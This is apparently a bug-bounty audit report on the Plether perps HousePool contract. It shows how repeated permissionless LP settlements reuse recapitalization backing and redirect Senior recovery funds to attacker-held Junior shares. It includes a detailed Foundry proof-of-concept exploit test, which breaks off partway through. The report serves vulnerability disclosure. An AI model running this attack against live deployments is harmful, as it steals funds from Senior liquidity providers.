# \#98594 [SC-High] Repeated LP settlements reuse recapitalization backing and redirect Senior recovery to Junior

**Submitted on Nov 8th 2026 at 22:36:44 UTC by @adeolu for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98594
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief/Intro

Every LP reconciliation caps pending recapitalization against the pool's entire current distributable balance, even when that balance has already been attributed to Senior by an earlier reconciliation. An attacker can retain matured zero-value redemption epochs and repeatedly invoke the permissionless settlement path, causing the same assets to be treated as fresh backing more than once, erasing previously recognized Senior principal, lowering Senior's high-water mark, and clearing the pending recapitalization bucket without new cash. Later trading revenue is then assigned to attacker-owned Junior shares before Senior has recovered, directly transferring funds owed to Senior LPs to the attacker.

## Vulnerability Details

### Intended accounting invariant

The protocol specifies that reconciliation must compare terminal equity **excluding reserved pending claimant inflows** with existing principal, charge losses Junior-first, preserve the Senior high-water mark through losses, and restore Senior to that mark before Junior receives surplus. The reason for reserving pending inflows is explicit: it prevents the same inflow from being counted twice. See [`ACCOUNTING_SPEC.md` lines 329-340](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340) and the [`High-water-mark protection` security invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L386-L395).

The owner legitimately funds recovery through `CfdEngine.recapitalizePool`. That function transfers real USDG to `HousePool` and records the same amount as a pending recapitalization claimant inflow:

```solidity
uint256 balanceBefore = settlementToken.balanceOf(address(pool));
settlementToken.safeTransferFrom(msg.sender, address(pool), amountAssets);
uint256 balanceAfter = settlementToken.balanceOf(address(pool));
uint256 received = balanceAfter >= balanceBefore ? balanceAfter - balanceBefore : 0;
if (received != amountAssets) {
    revert CfdEngine__UnexpectedTransferAmount(amountAssets, received);
}
pool.recordClaimantInflow(
    amountAssets,
    IHousePool.ClaimantInflowKind.Recapitalization,
    IHousePool.ClaimantInflowCashMode.CashArrived
);
```

Source: [`CfdEngine.sol` lines 627-653](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L653).

### Root cause: current distributable assets are treated as fresh pending-bucket backing on every call

`HousePool._reconcile` builds one snapshot, caps the pending buckets against its `distributable` value, passes that capped amount into ordinary reconciliation, and then applies the same capped amount to claimant accounting:

```solidity
HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot =
    HousePoolAccountingLib.buildReconcileSnapshot(accountingSnapshot);
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets = _getPendingClaimantBuckets();
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
    _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);

HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
    _currentPendingAccountingState(),
    reconcileSnapshot,
    _pendingClaimantBucketAssets(settleableClaimantBuckets),
    poolConfig.seniorRateBps,
    couponElapsed,
    markFresh
);

// ...store ordinary reconciliation result...
_applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
```

Source: [`HousePool.sol` lines 1555-1598](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598).

The cap is calculated against the **entire current** distributable balance:

```solidity
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

Source: [`HousePool.sol` lines 1829-1834](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834). The cap implementation is at [`HousePoolPendingPreviewLib.sol` lines 68-82](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L68-L82).

That is valid only if the distributable assets used by the cap have not already been recognized as tranche principal. After the first reconciliation, however, the backed portion of recapitalization is both physically present in `distributable` and already attributed to `seniorPrincipal`. A later call sees the same physical balance and caps the residual pending bucket against it again.

`planReconcile` then subtracts the replayed pending amount from that same `distributable` figure before comparing the remainder with stored principal:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}

// ...
uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;
HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
    HousePoolWaterfallAccountingLib.planReconcile(
        plan.state.waterfall.seniorPrincipal,
        plan.state.waterfall.juniorPrincipal,
        distributableToClaims
    );

// ...
if (plan.deltaAssets > 0) {
    plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
}
```

Source: [`HousePoolReconcilePlanLib.sol` lines 68-104](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L104).

This creates an artificial loss: the assets were not removed from the pool, but they were temporarily reserved again while the already-backed Senior principal remained in storage. If the replayed amount equals the backed Senior principal, ordinary reconciliation reduces both principals to zero.

### The empty-principal branch overwrites the original Senior recovery target

After the artificial loss is stored, `_applyPendingClaimantBucketsLive` reapplies the replayed amount and permanently decrements the pending bucket:

```solidity
HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
    state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
);
_decreasePendingClaimantBuckets(settleableClaimantBuckets);

_setWaterfallState(state.waterfall);
unassignedAssets = state.unassignedAssets;
```

Source: [`HousePool.sol` lines 1759-1775](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1775). The storage decrement is at [`HousePool.sol` lines 1787-1792](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1787-L1792).

Because the artificial loss made both principals zero, recapitalization takes the bootstrap branch. That branch replaces `seniorHighWaterMark` with the **current residual recapitalization intent**, forgetting the larger entitlement established by the earlier call:

```solidity
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    } else {
        uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
            ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
            : 0;
        // ...
    }
}
```

Source: [`HousePoolPendingPreviewLib.sol` lines 103-137](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137).

Once the mark has been lowered, the normal revenue waterfall does exactly what the corrupted state instructs: it fills only the smaller Senior gap and sends the remainder to Junior:

```solidity
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}

nextState.juniorPrincipal += remaining;
```

Source: [`HousePoolWaterfallAccountingLib.sol` lines 133-159](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159).

### State transition showing the double recognition

Let:

- `R` be the complete Senior recapitalization entitlement and original high-water mark;
- `D` be the current distributable backing recognized on the first settlement; and
- `P = R - D` be the pending recapitalization left after that settlement.

For the exploitable geometry `P > D` and `P - D < D`:

1. The first settlement correctly sets `seniorPrincipal = D`, keeps `seniorHighWaterMark = R`, and leaves `pending = P`.
2. The second settlement caps `P` at the same physical `D`. It subtracts `D` from distributable, observes zero assets behind the stored `D` of Senior principal, and records a fictitious `D` loss. It then reapplies `D`, decrements pending to `P - D`, and bootstraps `seniorHighWaterMark = P` rather than preserving `R`.
3. The third settlement caps the residual `P - D` against the same physical balance, removes and reapplies it, and decrements pending to zero without any new assets entering the pool.
4. When later trading revenue `X` arrives, Senior receives only its corrupted gap `P - D`. Junior receives `X - (P - D)`, although an unsplit honest reconciliation would route all `X` to the still-impaired Senior tranche.

Using the values in the reported attack path, `R = 100,063.014265`, `D = 42,709.014265`, and `P = 57,354` USDG. The corrupted Senior gap becomes only `14,644.985735` USDG. Of `50,500` USDG in later revenue, `35,855.014265` USDG is therefore redirected to Junior.

### Why an unprivileged attacker can retain enough reconciliation calls

The settlement entrypoint reconciles before processing queues, and the Router path is explicitly permissionless:

```solidity
/// @dev Permissionless and available while the router admin is paused.
function settleLpEpoch(
    bytes[] calldata pythUpdateData
) external payable nonReentrant {
    pythUpdateData;
    _delegateToKeeperSidecar();
}
```

Source: [`OrderRouter.sol` lines 474-484](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484). The pool calls `_reconcile` before clearing the matured epochs at [`HousePool.sol` lines 794-835](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L835).

A dust redemption would normally be rejected, but the minimum-size check exempts a controller redeeming its full balance:

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
    revert TrancheVault__WithdrawalTooSmall();
}
```

Source: [`TrancheVault.sol` lines 1611-1617](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1617).

An attacker can therefore distribute one share atom to many controllers and place each controller's full balance into a distinct hourly redemption epoch. After Junior is wiped, those heads quote zero assets. Processing a zero-value head increments the bounded settlement progress counter without moving assets, so each batch permits another reconciliation to commit:

```solidity
if (fullHeadAssets == 0) {
    // ...refund the zero-value epoch remainder...
    phase.processedEpochs += 1;
    continue;
}
```

Source: [`HousePool.sol` lines 951-986](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L951-L986). This progress matters because a settlement that processes no queue item reverts at [`HousePool.sol` lines 1179-1185](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1179-L1185).

No malicious owner action is needed. The owner follows the documented recovery flow; the attacker needs only Junior shares, prepared redemption epochs, and permissionless settlement calls.

Once the corrupted waterfall credits value to Junior, the ordinary asynchronous redemption path turns that accounting value into settlement tokens. A finalized claim computes the controller's asset entitlement and transfers those assets to the chosen receiver:

```solidity
assets = shares == remainingShares
    ? remainingAssets
    : Math.mulDiv(shares, remainingAssets, remainingShares, Math.Rounding.Floor);
_consumeRedeemClaim(requestId, shares, assets, receiver, controller);

// _consumeRedeemClaim:
IERC20(asset()).safeTransfer(receiver, assets);
```

Source: [`TrancheVault.sol` lines 1148-1167 and 1195-1213](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1148-L1213).

## Impact Details

**Selected in-scope impact: Critical — Direct theft of user funds, at rest or in motion, other than unclaimed yield.** This is the exact Critical qualifying impact stated in the program-supplied impact classification; the statement is reproduced here so the report does not depend on an audit-material file that is absent from the Git checkout.

The loss is a principal-allocation theft, not merely missed or unclaimed yield. Senior LPs hold an explicit recovery entitlement represented by `seniorHighWaterMark`; the protocol's own invariant requires later surplus to restore that impairment before Junior extracts value. Repeated settlement lowers that entitlement in storage and credits later realized trading revenue to attacker-owned Junior shares. The attacker can then redeem the revived Junior value through the normal asynchronous redemption lifecycle, while Senior is short by the same amount.

The amount diverted for a given affected recovery is:

```text
divertedToJunior = max(0, laterRevenue - corruptedSeniorGap)
corruptedSeniorGap = pendingAfterFirstSettlement - firstSeniorCredit
```

The original reported scenario diverts `35,855.014265 USDG`. The fully function-driven PoC below produced a second independent set of live-derived values:

| Measurement | USDG |
|---|---:|
| Original Senior entitlement | 101,061.808779 |
| First backed Senior credit | 43,473.425369 |
| Pending after the first settlement | 57,588.383410 |
| Later realized trading revenue | 32,554.360000 |
| Senior principal after attack | 57,588.383410 |
| Junior principal after attack | 18,439.401959 |
| Senior principal in honest control | 76,027.785369 |
| USDG actually transferred to the attacker | 18,255.961580 |

The attacked branch credits `18,439.401959 USDG` to Junior; the honest branch credits all later revenue to Senior and leaves Junior at zero. The Senior shortfall therefore exactly equals the value misallocated to Junior. The PoC then has every attacker-controlled queue controller reclaim its refunded share atom, returns those shares to the attacker, completes the real asynchronous redemption lifecycle, and verifies that the vault transfers `18,255.961580 USDG` into the attacker's wallet. The difference between gross Junior principal and the attacker's cash withdrawal is fully conserved as the genuinely elapsed Senior coupon plus residual maintenance-fee-owned Junior principal during the required cooldown and settlement interval; it does not weaken the demonstrated direct token theft. At scale, loss is bounded by the affected Senior recovery entitlement and subsequent pool revenue, rather than by the attacker's transaction costs. The attacker can prepare the necessary queue heads cheaply using share atoms and permissionless settlement calls.

## References

- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598)
- [`HousePool._settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L104)
- [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137)
- [`HousePoolWaterfallAccountingLib.distributeRevenue`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159)
- [`TrancheVault` redemption claim and token transfer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1148-L1213)
- [Canonical LP reconciliation specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L285-L340)
- [Ownership routing for pool inflows](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L628-L650)
- [HousePool and LP accounting security invariants](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L386-L402)


## Proof of Concept


## Proof of Concept

The test below adds no new mocks and performs no direct contract-storage writes (`vm.store`, `stdstore`, or equivalent). It uses the repository's existing test deployment, mintable settlement token, and oracle fixture only to fund actors and supply authenticated test prices. The trading helpers call the production Engine entrypoints under the configured Router identity; no trader claim, pending bucket, tranche principal, high-water mark, or pool token balance is fabricated. The test does not call `HousePool.recordClaimantInflow` directly and does not mint or burn assets directly into the pool. It reaches the vulnerable state through actual protocol functions:

1. Senior and Junior deposits complete through the asynchronous vault lifecycle.
2. The attacker transfers real Junior share atoms and submits 65 full-balance redemption requests in distinct hourly epochs.
3. Real Engine positions open and close profitably to create a terminal trader claim larger than pool assets and latch degraded mode.
4. The owner calls the real `recapitalizePool` and `clearDegradedMode` recovery entrypoints.
5. One legitimate post-recapitalization settlement credits the physically backed portion to Senior. Two later permissionless settlements replay that same backing.
6. Two real Engine positions close at a loss, transferring realized trading revenue into the pool.
7. The attacker-controlled queue controllers reclaim their refunded share atoms, and the attacker completes a new asynchronous redemption, claim, and real USDG transfer into its wallet.
8. An attacked branch is compared with an honest branch from the identical live state. The Foundry snapshot only forks that already-reached state for an A/B comparison; it does not construct or modify protocol state.

### 1. Fresh checkout

Install Git and Foundry, then run:

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
git rev-parse HEAD
forge --version
```

`git rev-parse HEAD` must print `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The reproduction was verified with Forge `1.0.0-stable` and Solc `0.8.35`; a compatible newer Forge release may also be used. On the first non-offline test run, Foundry downloads Solc `0.8.35` if it is not already installed.

### 2. Add the PoC test

Create `packages/perps/test/perps/accounting/waterfall/PendingRecapitalizationReplay.t.sol` with the complete content below. This is the only file required for the reproduction:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

import {HousePoolTestBase} from "../../shared/HousePoolTestBase.sol";

/// @notice Reproduces recapitalization replay using only production state transitions and existing test fixtures.
contract PendingRecapitalizationReplayTest is HousePoolTestBase {

    address private constant ATTACKER = address(0xA77AC);
    address private constant SENIOR_LP = address(0x5E1102);
    address private constant LONG_WINNER = address(0x10A6);
    address private constant SHORT_WINNER = address(0x5A047);
    address private constant REVENUE_TRADER_A = address(0xA11CE);
    address private constant REVENUE_TRADER_B = address(0xB0B);

    uint256 private constant ENTRY_PRICE = 1e8;
    uint256 private constant LONG_WIN_PRICE = 0.4e8;
    uint256 private constant LP_DEPOSIT = 100_000e6;
    uint256 private constant REQUEST_COUNT = 65;
    uint256 private constant ASSET_LOT = 100e6;

    function test_RepeatedPermissionlessSettlementReusesRecapitalizationAndDivertsRealizedLosses() public {
        _fundSenior(SENIOR_LP, LP_DEPOSIT);
        _fundJunior(ATTACKER, LP_DEPOSIT);
        assertGt(seniorVault.balanceOf(SENIOR_LP), 0, "Senior LP deposit must activate");
        assertGt(juniorVault.balanceOf(ATTACKER), 0, "attacker's Junior deposit must activate");

        uint256[] memory controllerRequestIds = _queueFullBalanceRedeemEpochs(REQUEST_COUNT);

        // Consume one bounded batch while the pool is healthy. This checkpoints the real Senior coupon and leaves
        // exactly three replay batches plus one final reconciliation head, matching the production work cap.
        vm.prank(ATTACKER);
        IHousePool.LpEpochSettlementResult memory checkpoint = pool.settleLpEpoch(0, 0);
        assertEq(checkpoint.juniorProcessedEpochs, pool.MAX_LP_EPOCHS_PER_PHASE());
        assertTrue(checkpoint.juniorBacklog, "49 queued epochs must remain");

        uint256 seniorEntitlement = pool.seniorHighWaterMark();
        assertEq(pool.seniorPrincipal(), seniorEntitlement, "Senior must be unimpaired before the terminal trades");

        _createTerminalTraderClaimWithTrades();

        uint256 terminalTraderClaim = engine.totalTraderClaimBalanceAssets();
        uint256 terminalPhysicalAssets = pool.totalAssets();
        emit log_named_uint("Senior entitlement (USDG atoms)", seniorEntitlement);
        emit log_named_uint("Terminal physical assets (USDG atoms)", terminalPhysicalAssets);
        emit log_named_uint("Terminal trader claim (USDG atoms)", terminalTraderClaim);
        assertGt(terminalTraderClaim, 0, "real profitable closes must create a trader claim");
        assertGt(
            terminalTraderClaim,
            terminalPhysicalAssets,
            "terminal trader claim must exceed the remaining physical pool assets"
        );
        assertTrue(engine.degradedMode(), "terminal insolvency must latch degraded mode");
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), 0, "all long exposure must be closed");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "all short exposure must be closed");

        // The owner follows the documented recovery path through the real Engine entrypoints.
        settlementToken.mint(address(this), seniorEntitlement);
        settlementToken.approve(address(engine), seniorEntitlement);
        engine.recapitalizePool(seniorEntitlement);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "real recapitalization must permit degraded-mode recovery");

        vm.prank(ATTACKER);
        IHousePool.LpEpochSettlementResult memory first = pool.settleLpEpoch(0, 0);
        assertEq(first.juniorProcessedEpochs, pool.MAX_LP_EPOCHS_PER_PHASE());
        assertTrue(first.juniorBacklog, "33 queued epochs must remain after the legitimate settlement");

        uint256 firstSeniorPrincipal = pool.seniorPrincipal();
        uint256 expectedDistributableRecapitalization = terminalPhysicalAssets + seniorEntitlement - terminalTraderClaim;
        assertEq(
            firstSeniorPrincipal,
            expectedDistributableRecapitalization,
            "first settlement may credit only recapitalization above the real trader claim"
        );
        uint256 pendingAfterFirstSettlement = pool.pendingRecapitalizationAssets();
        emit log_named_uint("First Senior credit (USDG atoms)", firstSeniorPrincipal);
        emit log_named_uint("Pending recap after first settlement (USDG atoms)", pendingAfterFirstSettlement);
        assertEq(
            pendingAfterFirstSettlement,
            seniorEntitlement - firstSeniorPrincipal,
            "the unsupported part of the real recapitalization must remain pending"
        );
        assertEq(pool.seniorHighWaterMark(), seniorEntitlement, "full Senior entitlement must remain protected");
        assertEq(pool.juniorPrincipal(), 0, "Junior must remain wiped");

        // This geometry makes the second call zero both principals and enter the vulnerable HWM bootstrap branch,
        // while the third call can consume the residual. Both inequalities are derived from live protocol state.
        assertGt(
            pendingAfterFirstSettlement, firstSeniorPrincipal, "second settlement must replay all distributable backing"
        );
        assertLt(
            pendingAfterFirstSettlement - firstSeniorPrincipal,
            firstSeniorPrincipal,
            "third settlement must be able to consume the replay residual"
        );

        _openRealRevenuePositions(firstSeniorPrincipal, pendingAfterFirstSettlement - firstSeniorPrincipal);
        uint256 poolCashBeforeReplay = settlementToken.balanceOf(address(pool));
        uint256 accountedAssetsBeforeReplay = pool.accountedAssets();
        uint256 honestFork = vm.snapshotState();

        _permissionlessRouterSettlement();
        assertEq(
            settlementToken.balanceOf(address(pool)), poolCashBeforeReplay, "first replay must receive no new pool cash"
        );
        assertEq(pool.accountedAssets(), accountedAssetsBeforeReplay, "first replay must account no new backing");
        assertEq(pool.seniorPrincipal(), firstSeniorPrincipal, "first replay must reuse the existing Senior backing");
        assertEq(
            pool.seniorHighWaterMark(),
            pendingAfterFirstSettlement,
            "first replay must replace the full entitlement with the residual intent"
        );
        assertEq(
            pool.pendingRecapitalizationAssets(),
            pendingAfterFirstSettlement - firstSeniorPrincipal,
            "first replay must consume the same backing from pending storage"
        );

        _permissionlessRouterSettlement();
        assertEq(
            settlementToken.balanceOf(address(pool)),
            poolCashBeforeReplay,
            "second replay must receive no new pool cash"
        );
        assertEq(pool.accountedAssets(), accountedAssetsBeforeReplay, "second replay must account no new backing");
        assertEq(pool.seniorPrincipal(), firstSeniorPrincipal, "second replay must leave the reused backing in Senior");
        assertEq(
            pool.seniorHighWaterMark(),
            pendingAfterFirstSettlement,
            "second replay must preserve the already-corrupted recovery target"
        );
        assertEq(pool.pendingRecapitalizationAssets(), 0, "third call clears pending without new backing");

        uint256 attackedRevenue = _closeRevenuePositionsAtALoss();
        uint256 attackedSeniorBeforeRevenueReconcile = pool.seniorPrincipal();

        vm.prank(ATTACKER);
        IHousePool.LpEpochSettlementResult memory attackedFinal = pool.settleLpEpoch(0, 0);
        assertEq(attackedFinal.juniorProcessedEpochs, 1, "last queue head must commit revenue reconciliation");
        assertFalse(attackedFinal.juniorBacklog, "attack queue must be exhausted");

        uint256 attackedSenior = pool.seniorPrincipal();
        uint256 attackedJunior = pool.juniorPrincipal();
        uint256 attackerAssets = juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
        emit log_named_uint("Realized trading revenue (USDG atoms)", attackedRevenue);
        emit log_named_uint("Attacked Senior principal (USDG atoms)", attackedSenior);
        emit log_named_uint("Attacked Junior principal (USDG atoms)", attackedJunior);
        assertGt(attackedRevenue, 0, "real losing closes must transfer revenue into HousePool");
        assertGt(attackedSenior, attackedSeniorBeforeRevenueReconcile, "some revenue must still restore Senior");
        assertGt(attackedJunior, 0, "revenue above the corrupted HWM must flow to Junior");
        assertGt(attackerAssets, 0, "attacker's wiped Junior shares must regain value");

        // The attacker-controlled one-share controllers reclaim their refunded queue atoms, return them to the attacker,
        // and the attacker completes the real asynchronous redemption lifecycle to extract the diverted USDG.
        _reclaimControllerShares(controllerRequestIds);
        uint256 attackerSharesForExit = juniorVault.balanceOf(ATTACKER);
        uint256 attackerCashBeforeExit = settlementToken.balanceOf(ATTACKER);
        (, uint256 fundedAttackerShares, uint256 extractedAssets) =
            _redeemAsync(juniorVault, ATTACKER, attackerSharesForExit, false);
        emit log_named_uint("Attacker extracted USDG atoms", extractedAssets);
        assertEq(fundedAttackerShares, attackerSharesForExit, "the attacker's full Junior balance must be funded");
        assertEq(
            settlementToken.balanceOf(ATTACKER) - attackerCashBeforeExit,
            extractedAssets,
            "the funded Junior claim must transfer real USDG to the attacker"
        );
        assertGt(extractedAssets, 0, "the attacker must extract real USDG from the diverted Junior principal");
        assertEq(
            extractedAssets + (pool.seniorPrincipal() - attackedSenior) + pool.juniorPrincipal(),
            attackedJunior,
            "attacker cash, elapsed Senior coupon, and residual fee-owned Junior principal must conserve diverted value"
        );

        // Honest control: restore the identical state with the same live positions. Advance the Engine mark through
        // actual calls without reconciling, then execute the same losing closes and a single LP settlement.
        assertTrue(vm.revertToState(honestFork));
        vm.deleteStateSnapshot(honestFork);

        _advanceEntryMarkWithoutSettlement();
        _advanceEntryMarkWithoutSettlement();
        uint256 honestRevenue = _closeRevenuePositionsAtALoss();
        assertEq(honestRevenue, attackedRevenue, "both branches must realize identical trading revenue");

        vm.prank(ATTACKER);
        pool.settleLpEpoch(0, 0);

        uint256 honestSenior = pool.seniorPrincipal();
        emit log_named_uint("Honest Senior principal (USDG atoms)", honestSenior);
        assertEq(pool.juniorPrincipal(), 0, "honest reconciliation must not pay Junior while Senior is impaired");
        assertEq(pool.seniorHighWaterMark(), seniorEntitlement, "honest reconciliation must preserve Senior's target");
        assertEq(
            honestSenior - attackedSenior,
            attackedJunior,
            "every asset diverted to Junior is missing from Senior in the attacked branch"
        );
        assertEq(
            honestSenior - firstSeniorPrincipal,
            honestRevenue,
            "without replay all realized trading revenue must accrue to Senior"
        );
    }

    function _createTerminalTraderClaimWithTrades() private {
        uint256 physicalAssets = pool.totalAssets();
        uint256 shortNotional = _floorToAssetLot((physicalAssets * 95) / 100);
        uint256 longNotional = _floorToAssetLot((physicalAssets * 56) / 100);
        uint256 shortSize = shortNotional * 1e12;
        uint256 longSize = longNotional * 1e12;

        uint256 shortMargin = shortNotional / 10;
        uint256 longMargin = longNotional / 10;
        _fundTrader(SHORT_WINNER, shortMargin + ASSET_LOT);
        _fundTrader(LONG_WINNER, longMargin + ASSET_LOT);

        _open(SHORT_WINNER, CfdTypes.Side.SHORT, shortSize, shortMargin, ENTRY_PRICE);
        _open(LONG_WINNER, CfdTypes.Side.LONG, longSize, longMargin, ENTRY_PRICE);

        _ensureLaterOracleTime();
        _close(LONG_WINNER, CfdTypes.Side.LONG, longSize, LONG_WIN_PRICE);
        assertTrue(engine.degradedMode(), "first winner must make the remaining side insolvent");

        _ensureLaterOracleTime();
        _close(SHORT_WINNER, CfdTypes.Side.SHORT, shortSize, CAP_PRICE);
    }

    function _openRealRevenuePositions(uint256 availableBacking, uint256 corruptedSeniorGap) private {
        uint256 totalNotional = _floorToAssetLot((availableBacking * 3) / 4);
        uint256 notionalPerTrader = _floorToAssetLot(totalNotional / 2);
        totalNotional = notionalPerTrader * 2;
        assertGt(totalNotional, corruptedSeniorGap, "realized losses must exceed the corrupted Senior gap");

        uint256 size = notionalPerTrader * 1e12;
        uint256 funding = notionalPerTrader + ASSET_LOT;
        _fundTrader(REVENUE_TRADER_A, funding);
        _fundTrader(REVENUE_TRADER_B, funding);

        _ensureLaterOracleTime();
        _open(REVENUE_TRADER_A, CfdTypes.Side.LONG, size, notionalPerTrader, ENTRY_PRICE);
        _open(REVENUE_TRADER_B, CfdTypes.Side.LONG, size, notionalPerTrader, ENTRY_PRICE);
    }

    function _closeRevenuePositionsAtALoss() private returns (uint256 revenue) {
        uint256 poolAssetsBefore = pool.totalAssets();
        uint256 sizeA = _positionSize(REVENUE_TRADER_A);
        uint256 sizeB = _positionSize(REVENUE_TRADER_B);

        _ensureLaterOracleTime();
        _close(REVENUE_TRADER_A, CfdTypes.Side.LONG, sizeA, CAP_PRICE);
        _ensureLaterOracleTime();
        _close(REVENUE_TRADER_B, CfdTypes.Side.LONG, sizeB, CAP_PRICE);

        revenue = pool.totalAssets() - poolAssetsBefore;
        assertEq(_positionSize(REVENUE_TRADER_A), 0, "first revenue position must close");
        assertEq(_positionSize(REVENUE_TRADER_B), 0, "second revenue position must close");
    }

